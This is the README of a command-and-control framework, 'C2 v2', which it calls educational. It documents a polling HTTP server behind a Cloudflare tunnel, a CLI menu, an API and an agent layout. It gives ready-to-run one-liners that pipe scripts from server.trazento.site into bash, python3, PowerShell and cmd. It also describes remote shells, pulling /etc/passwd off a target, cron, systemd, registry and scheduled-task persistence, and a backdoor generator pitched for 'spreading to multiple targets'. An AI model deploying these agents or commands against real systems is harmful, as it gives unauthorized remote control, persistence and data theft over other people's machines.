# C2 v2 - Command & Control

HTTP-based C2 server for network security simulations. Agents communicate via polling over HTTP/HTTPS. Designed for use behind a Cloudflare tunnel.

## Architecture

```
[Target Machine]
    ├── curl .../sh | bash   → agent.sh downloads agent.py
    ├── curl .../py | python3 → agent.py runs directly
    └── curl .../ps1          → PowerShell agent
    │
    ▼  beacon every 10s (GET /tasks/<id>?token=...)
    ▼  execute tasks, POST results
    │
[Cloudflare Tunnel: server.trazento.site]
    │
    ▼  proxy all paths to localhost:8080
    │
[C2 Server: 0.0.0.0:8080]
    ├── HTTP handler (REST API)
    ├── Agent manager (state + task queue)
    └── CLI menu (interactive control)
```

## Quick Start

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python3 c2.py
```

Server starts on `0.0.0.0:8080`. Auth token generated and displayed at startup.

## Deploy Agent

```bash
# Linux (via shell launcher)
curl -s https://server.trazento.site/sh | bash

# Linux (direct Python)
curl -s https://server.trazento.site/py | python3

# Windows (PowerShell)
curl -s https://server.trazento.site/ps1 | powershell -c -

# Windows (Batch)
curl -s https://server.trazento.site/bat | cmd
```

Agent beacons every 10 seconds. Wait up to 30s for first check-in.

---

## Menu Reference

| # | Option | Description |
|---|--------|-------------|
| 1 | **Start listener** | Start HTTP server on `0.0.0.0:8080`. Required before deploying agents. |
| 2 | **Stop listener** | Shutdown HTTP server. Drops all agent connections. |
| 3 | **List agents** | Show registered agents: ID, hostname, OS, IP, last seen. |
| 4 | **Interact with agent** | Persistent `/bin/sh` shell. State carries across commands. |
| 5 | **Send shell command** | One-shot command to agent. Output printed once. |
| 6 | **Upload file** | Local → remote via base64 over HTTP. |
| 7 | **Download file** | Remote → local via base64 over HTTP. |
| 8 | **Install persistence** | Cron/systemd (Linux), Registry/schtask (Windows). |
| 9 | **Remove persistence** | Reverse of option 8. |
| 10 | **Generate backdoor** | Bake C2 URL + token into standalone agent files. |
| 11 | **Agent results** | View task history for a specific agent. |
| 12 | **View logs** | In-memory log buffer. Tail, follow, clear. |
| 13 | **Show token** | Display current auth token and one-liner commands. |
| 0 | **Exit** | Stop server and quit. |

---

## Option Details

### 1/2. Listener Control

```text
C2> 1
[12:43:18] [+] Listener started on 0.0.0.0:8080

C2> 2
[12:43:20] [+] Listener stopped
```

### 3. List Agents

Shows agent ID (8-char hex), hostname, OS version, detected IP, and last beacon timestamp. Agents are removed from the list only on server restart.

```text
C2> 3
[+] 2 agent(s) connected:
  a1b2c3d4 | target-pc | Linux 6.8.0-45-generic | 10.0.0.5 | last: 14:32:10
  e5f6g7h8 | server01  | Windows 10             | 10.0.0.10| last: 14:32:08
```

### 4. Interactive Shell

Enters a persistent `/bin/sh` session. Uses `select()` to read output with short timeout. Commands that produce no output return empty string. Type `exit` or `quit` to return to menu.

```text
C2> 4
shell@a1b2c3d4> whoami
root
shell@a1b2c3d4> cd /tmp && pwd
/tmp
shell@a1b2c3d4> ls -la
total 8
drwxrwxrwt 2 root root 4096 ...
shell@a1b2c3d4> exit
```

Best for: recon, exploration, multi-command tasks. Stateful — `cd`, variables, and env persist.

### 5. Shell Command (One-Shot)

Fires a single command and waits for output. Returns to menu after output received or 30s timeout.

```text
C2> 5
Agent ID: a1b2c3d4
Command: ip addr | grep inet
    inet 127.0.0.1/8 ...
    inet 10.0.0.5/24 ...
```

Best for: quick checks, single commands, automation.

### 6/7. File Transfer

Upload:

```text
C2> 6
Agent ID: a1b2c3d4
Local path: ./payload.exe
Remote path: /tmp/payload.exe
[*] Task sent, waiting...
[+] Uploaded to /tmp/payload.exe (74240 bytes)
```

Download:

```text
C2> 7
Agent ID: a1b2c3d4
Remote path: /etc/passwd
Save as: ./passwd_dump
[+] Saved to ./passwd_dump (2145 bytes)
```

Files transferred as base64 in JSON payload. Max practical size: ~10MB.

### 8/9. Persistence

Install:

| Method | OS | Mechanism | Details |
|--------|----|-----------|---------|
| Cron | Linux | crontab entry | Repeats every minute |
| Systemd | Linux | systemd service | Creates + enables service unit |
| Registry | Windows | HKCU\...\Run | Runs on user login |
| Scheduled Task | Windows | schtasks | Repeats every minute |

```text
C2> 8
Agent ID: a1b2c3d4
=== Persistence Methods ===
1. Cron job (Linux)
2. Systemd service (Linux)
3. Registry Run key (Windows)
4. Scheduled Task (Windows)

Choice: 2
Script path on target: /opt/c2agent.py
[+] Systemd service sys-abc123 created
```

Remove persistence with option 9 — prompts for method and identifier.

### 10. Generate Backdoor

Creates standalone payload files with C2 URL and auth token baked in. Useful for offline deployment or spreading to multiple targets.

```text
C2> 10
=== Backdoor Generator ===
1. Generate Python payload
2. Generate PowerShell payload
3. Generate Bash payload
4. Generate Batch payload

Choice: 1
[+] Backdoor generated: payload.py
[+] C2 URL: https://server.trazento.site
[*] Run: python3 payload.py
```

### 11. Agent Results

Task history for a specific agent. Shows task ID, status (success/error), and first 200 chars of output.

```text
C2> 11
Agent ID: a1b2c3d4
[success] abc12345: root
[success] def67890: /tmp
```

### 12. Log Viewer

In-memory circular buffer (max 2000 entries). Captures all HTTP requests and server messages.

```text
C2> 12
=== LOG VIEWER ===
1. Show last 20 lines
2. Show last N lines
3. Follow mode (Ctrl+C to stop)
4. Clear logs
0. Back to menu
```

Follow mode polls every 0.3s for new entries. Useful for watching agent activity in real time.

### 13. Show Token

```text
C2> 13
Auth token: a1b2c3d4e5f6g7h8
One-liner: curl -s https://server.trazento.site/sh | bash
```

---

## Authentication

Server generates a random 16-char hex token at startup. Token required for:

- `POST /register` — included in JSON body as `token` field
- `GET /tasks/<id>` / `GET /beacon/<id>` — passed as `?token=` query param

Endpoints **without** auth:
- `GET /` — health check
- `GET /py`, `/sh`, `/ps1`, `/bat` — agent scripts (token embedded at serve time)

Agents without valid token receive `401 Unauthorized` and cannot register or retrieve tasks.

---

## REST API

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| `GET` | `/` | No | Health check |
| `GET` | `/py`, `/sh`, `/ps1`, `/bat` | No | Agent scripts (token inside) |
| `POST` | `/register` | Yes (body) | Register new agent |
| `GET` | `/tasks/<id>` | Yes (query) | Get pending tasks |
| `GET` | `/beacon/<id>` | Yes (query) | Alias for `/tasks/<id>` |
| `POST` | `/result/<id>` | No | Submit task result |

Legacy `/api/v1/` prefix also supported: `/api/v1/register`, `/api/v1/tasks/<id>`.

### Register

```json
POST /register
{
  "hostname": "target-pc",
  "username": "root",
  "os": "Linux 6.8.0",
  "ip": "10.0.0.5",
  "arch": "x86_64",
  "token": "a1b2c3d4e5f6g7h8"
}
```

Response: `{"agent_id": "a1b2c3d4"}`

### Poll Tasks

```text
GET /tasks/a1b2c3d4?token=a1b2c3d4e5f6g7h8
```

Response: `{"tasks": [{"task_id": "...", "command": "shell", "params": {"command": "whoami"}, "status": "sent", "timestamp": ...}]}`

### Submit Result

```json
POST /result/a1b2c3d4
{
  "task_id": "abc123",
  "output": "root\n",
  "status": "success"
}
```

---

## Project Structure

```
C2_V2/
├── c2.py                    # Main entry point — CLI menu
├── requirements.txt         # Python deps: requests, colorama
├── infra.md                 # Project requirements doc
├── server/
│   ├── httpd.py             # Threaded HTTP server wrapper
│   ├── handler.py           # Request handler — routes, auth, script serving
│   └── agents.py            # Agent state, task queue, result storage
├── modules/
│   ├── shell.py             # Interactive shell loop
│   ├── file_transfer.py     # Upload/download orchestration
│   ├── backdoor.py          # Payload generator
│   ├── persistence.py       # Install/remove persistence menu
│   └── logger.py            # Log buffer + viewer UI
└── agent/
    ├── agent.py             # Cross-platform Python agent
    ├── agent.sh             # Linux launcher
    ├── agent.ps1            # PowerShell agent
    └── agent.bat            # Windows batch launcher
```

## Cloudflare Tunnel

Required: a Cloudflare tunnel pointing `server.trazento.site` → `http://localhost:8080`.

This project expects the tunnel already configured. The tunnel provides:
- HTTPS termination (TLS cert managed by Cloudflare)
- Public domain (`server.trazento.site`)
- DDoS protection and access control

---

## Security Notes

- Auth token prevents unauthorized agents.
- Token printed at startup only. Use option 13 to redisplay.
- No encryption beyond Cloudflare TLS (HTTP between tunnel and server).
- Token resets on each server restart — old agents must be redeployed.
- Not designed for production use — educational/simulation only.
